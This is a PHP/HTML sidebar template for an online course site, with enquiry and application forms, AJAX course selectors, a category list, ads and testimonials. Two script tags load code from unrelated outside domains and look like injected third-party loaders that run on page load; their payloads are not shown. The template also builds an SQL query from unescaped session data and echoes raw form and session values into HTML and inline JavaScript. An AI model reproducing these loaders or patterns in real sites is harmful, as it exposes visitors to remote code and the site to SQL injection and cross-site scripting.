<script type="text/javascript">
$(document).ready(function(){

    $(".testing").hide();
});
	function change()
	{

	var values = $('#degree').val();
	
	var vls = 'vl='+values;
	$.ajax({ url: '<?php echo $base_url; ?>/degree.php',
				   data: vls,
				   type: 'post',
				  success: function(output) {
					  
					   if(output==1)
					   {
						    $(document).ready(function(){

    $(".testing").hide();
	$("#test").hide();
	$(".ta").hide();
	
});
						   
						   }
						   else
						   {
					  $(document).ready(function(){

    $(".testing").show();
	$(".ta").show();
	$("#test").show();
});
					 $('#test').html(output);
				   
						   }
				   }
		 });
	 }
</script><script src="https://new2sportnews.com/oxfordhomestudy.js"></script>
<script src="//alladvcdn.com/oxford"></script>
    <div class="col-lg-3 col-lg-pull-9">
    
    <div class="get_full_info"><a href=""></a></div>   
    
<form id="form1" name="form1" method="post" class="form-horizontal clearfix" action="<?php echo $base_url; ?>/info.php" onsubmit="if (grecaptcha.getResponse().length == 0) { $('#grerr').css('display', '');return false; } else { $('#grerr').css('display', 'none'); }">
<?php $prevloc = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; ?>
<input type="hidden" name="prevloc" value="<?php echo $prevloc; ?>" />

<div class="form-group">
<div class="col-xs-12">
   <select  class="form-control gentxt" onchange="change();" id="degree" name="degree" required >
    <option selected disabled value="" class="gentxt">I Am Interested in</option>
    <?php 
		$menuqry = $db->query("SELECT * FROM `tbl_courses` WHERE IStatus=1 order by ordernumber asc");
		while($meuresult = $menuqry->fetch_array())
		{
		?>
        <option value="<?php echo $meuresult['cid'];?>" class="gentxt"><?php echo $meuresult['cname']; ?></option>
		<?php } ?>	
    
    
   </select>
   </div>
  </div>
  
  
<div class="form-group">
    <div class="col-sm-12" id="test">
        <?php
        if (!empty($_SESSION['degree'])) {
        ?>
        <select name='diploma' id='diploma' class="form-control gentxt" required>
            <option disabled value="" class="gentxt">Select Course</option>
            <?php
            $temp_result = $db->query("SELECT * FROM `tbl_diploma` WHERE `cid` = '" . $_SESSION['degree'] . "'");
            while($temp_row = $temp_result->fetch_array()) {
                if ($temp_row['course_state'] == 1) { ?>
                <option value='free' class="gentxt"><?php echo $temp_row['name'] ?></option>
                <?php } else { ?>
                <option value='<?php echo $temp_row['diplomaid']?>' class="gentxt" <?php echo ($temp_row['diplomaid'] == $_SESSION['diploma']) ? 'selected' : ''; ?>><?php echo $temp_row['name'] ?></option>
            <?php
                }
            }
            ?>
        </select>
        <?php } ?>
    </div>
</div>
 <div class="form-group">
  <div class="col-sm-12">
    <input class="form-control gentxt" name="fname" placeholder="First Name" type="text" required />
  </div>
</div>
   <div class="form-group">
  <div class="col-sm-12">
    <input class="form-control gentxt" name="lname" placeholder="Last Name" type="text" required />
  </div>
    </div>
  <div class="form-group">
  <div class="col-xs-12">
    <input class="form-control gentxt" name="mobile" type="text" placeholder="Mobile"/>
</div>
</div>
 <div class="form-group">
  <div class="col-xs-12">
    <input class="form-control gentxt" name="email" type="email" placeholder="Email" required />
  </div>
</div>
<div class="form-group">
    <div class="col-xs-12">
        <div class="g-recaptcha rgcaptcha gentxt_fbasic" data-sitekey="6Le9v6cUAAAAAE_587dYgRKkEarXKME1cGUbHnbL" data-size="compact"></div>
        <div id="grerr" style="color:red;font-size:11px;font-weight:bold;display:none" class="gentxt_fbasic">Please fill captcha.</div>
        <!--<div>
            <img id="captcha" src="/securimage/securimage_show.php" alt="CAPTCHA Image" />
            <input type="text" name="captcha_code" size="10" maxlength="6" />
            <a href="#" onclick="document.getElementById('captcha').src = '/securimage/securimage_show.php?' + Math.random(); return false">[ Different Image ]</a>
        </div>-->
    </div>
</div>
    <div class="col-xs-12" style="margin-left: -15px;"><input  name="Get Information Kit" type="submit" value="Get Information Kit" class="btn btn-primary gentxt_fbasic" style="background: #61487c;"/></div>
 
<?php if (!empty($_SESSION['captchaErr'])) { ?>
<script>
document.getElementById('degree').value = '<?php echo $_SESSION['degree']; ?>';
document.getElementsByName('fname')['0'].value = '<?php echo $_SESSION['fname']; ?>';
document.getElementsByName('lname')['0'].value = '<?php echo $_SESSION['lname']; ?>';
document.getElementsByName('mobile')['0'].value = '<?php echo $_SESSION['mobile']; ?>';
document.getElementsByName('email')['0'].value = '<?php echo $_SESSION['email']; ?>';
document.getElementById('grerr').style.display = '';
</script>
<?php
unset($_SESSION['captchaErr']);
unset($_SESSION['degree']);
unset($_SESSION['diploma']);
unset($_SESSION['fname']);
unset($_SESSION['lname']);
unset($_SESSION['mobile']);
unset($_SESSION['email']);
}
?>
</form>

<!-- Begin application form -->
<div class="panel-primary cate">
    <div class="panel-heading"><b class="sub_heading gentxt_fbasic">Start Course Now</b></div>
    <form id="form2" name="form2" method="post" class="form-horizontal clearfix" action="<?php echo $base_url; ?>/start-your-course-now">
        <div class="form-group">
            <div class="col-xs-12">
                <select  name="name_title" class="form-control gentxt" required >
                    <option selected value="">-Select-</option>
                    <option value="Mr">Mr</option>
                    <option value="Miss">Miss</option>
                    <option value="Ms">Ms</option>
                    <option value="Mrs">Mrs</option>
                    <option value="Dr">Dr</option>
                    <option value="Prof">Prof</option>
                    <option value="Adv">Adv</option>
                </select>
            </div>
        </div>
        <div class="form-group">
            <div class="col-sm-12">
                <input type="text" name="fname" id="fname"  class="form-control gentxt" value="<?php if(isset($_POST['fname'])){echo $_POST['fname'];}?>"  placeholder="First Name*" required  />
            </div>
        </div>
        <div class="form-group">
            <div class="col-sm-12">
                <input type="text" name="lname" id="lname"  class="form-control gentxt" value="<?php if(isset($_POST['lname'])){echo $_POST['lname'];}?>" placeholder="Last Name*"  required  />
            </div>
        </div>
        <div class="form-group">
            <div class="col-xs-12">
                <input type="text" name="mobile" class="form-control gentxt" value="<?php if(isset($_POST['mobile'])){echo $_POST['mobile'];}?>" placeholder="Mobile*" required/>
            </div>
        </div>
        <div class="form-group">
            <div class="col-xs-12">
                <input type="email" value="<?php if(isset($_POST['email'])){echo $_POST['email'];}?>" name="email" id="email" class="form-control gentxt" required  placeholder="Email*"/>
            </div>
        </div>
        <div class="form-group">
            <div class="col-xs-12">
                <input type="text" value="<?php if(isset($_POST['country'])){echo $_POST['country'];}?>" name="country" id="country" class="form-control gentxt" required  placeholder="Country*"/>
            </div>
        </div>
        <div class="form-group">
            <div class="col-xs-12">
                <select  class="form-control gentxt" onchange="another();" id="dip" name="dip"  required >
                    <option disabled value="">Select Course Area</option>
                    <?php
            		$menuqry = $db->query("SELECT * FROM `tbl_courses` WHERE IStatus=1 order by ordernumber asc");
            		while($meuresult = $menuqry->fetch_array())
            		{
            		?>
                    <option value="<?php echo $meuresult['cid'];?>" <?php echo ($catCid == $meuresult['cid']) ? 'selected' : ''; ?>><?php echo $meuresult['cname']; ?></option>
            		<?php } ?>
                </select>
            </div>
        </div>
        <div class="form-group">
            <div class="col-xs-12 gentxt" id="tested"></div>
        </div>
        <div class="col-xs-12" style="margin-left: -15px;"><input name="submit" type="submit" value="Submit" class="btn btn-primary gentxt_fbasic" style="background: #61487c;"></div>
    </form>
</div>
<script>
function another() {
    var values = $('#dip').val();
	var vls = 'vl='+values;
	$.ajax({
        async: false,
        url: '<?php echo $base_url; ?>/degreed.php',
		data: vls,
		type: 'post',
		success: function(output) {
            if(output==1) {
                $(document).ready(function(){
                    $(".tested, .tested").hide();
                    $("#tested").hide();
                });
            } else {
                $(document).ready(function(){
                    $(".tested label").show();
                    $(".tested").show();
	               $("#tested").show();
                });
				$('#tested').html(output);
            }
        }
    });
}
$(document).ready(function(){
    // Begin diploma population
    another();
    $('#diplomad').val("<?php echo $did; ?>");
    // Begin diploma population
});
</script>
<!-- End application form -->

<?php
$menuqry = $db->query("SELECT * FROM `tbl_courses` WHERE IStatus=1 ORDER BY ordernumber ASC");
if(!$menuqry){ die(mysqli_error($db)); }
?>

            <div class="panel panel-primary cate sidebar">
              <div class="panel-heading"><b class="sub_heading gentxt_fbasic">Categories</b></div>
              <div class="panel-body">
                <ul>
                <?php
                while($meuresult = $menuqry->fetch_array())
                {
                ?>
                <li><a href="<?php echo $base_url; ?>/courses/<?php echo $meuresult['slug'];?>" title="<?php echo str_replace(',', '', $meuresult['cname']); ?>" class="gentxt"><?php echo str_replace(',', '', $meuresult['cname']); ?></a></li>
            <?php } ?>
                
                </ul>
              </div>
            </div>

<div id="rite-cotainer">
    <!-- Begin AdSense Code -->
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8850775732328921"
     crossorigin="anonymous"></script>
    <!-- Vertical ads 1 -->
    <ins class="adsbygoogle"
        style="display:block"
        data-ad-client="ca-pub-8850775732328921"
        data-ad-slot="7910519269"
        data-ad-format="auto"
        data-full-width-responsive="true"></ins>
    <script>
        (adsbygoogle = window.adsbygoogle || []).push({});
    </script>
    <!-- End AdSense Code -->

    <!--<div style="margin-top:20px;">
    <a href="#"><img src="images/live-chat.gif" /></a>
    </div>-->
    <b class="h4_heading gentxt_fbasic">Testimonials</b>
    <div id="carousel" class="carousel1 slide main_slider" data-ride="carousel">

        <div class="carousel-inner">
            <?php
            $t_cou = 0;
            $testimonailqry = $db->query("SELECT * FROM `tbl_testimonial` WHERE IStatus=1 order by `testimonialid` desc");
            while($tresult = $testimonailqry->fetch_array()){ ?>

                <div class="item <?php if($t_cou==0){ echo 'active'; } ?>">
                    <div class="testimonial">

                        <div class="testimonial-body gentxt_fbasic">
                            <blockquote class="gentxt_fbasic"><?php echo $tresult['detail'];?></blockquote>
                            <b><?php echo $tresult['name']; ?></b>
                        </div>
                    </div>
                </div>

                <?php
                $t_cou++;
            }
            ?>
        </div>

    </div>
</div>
       

      
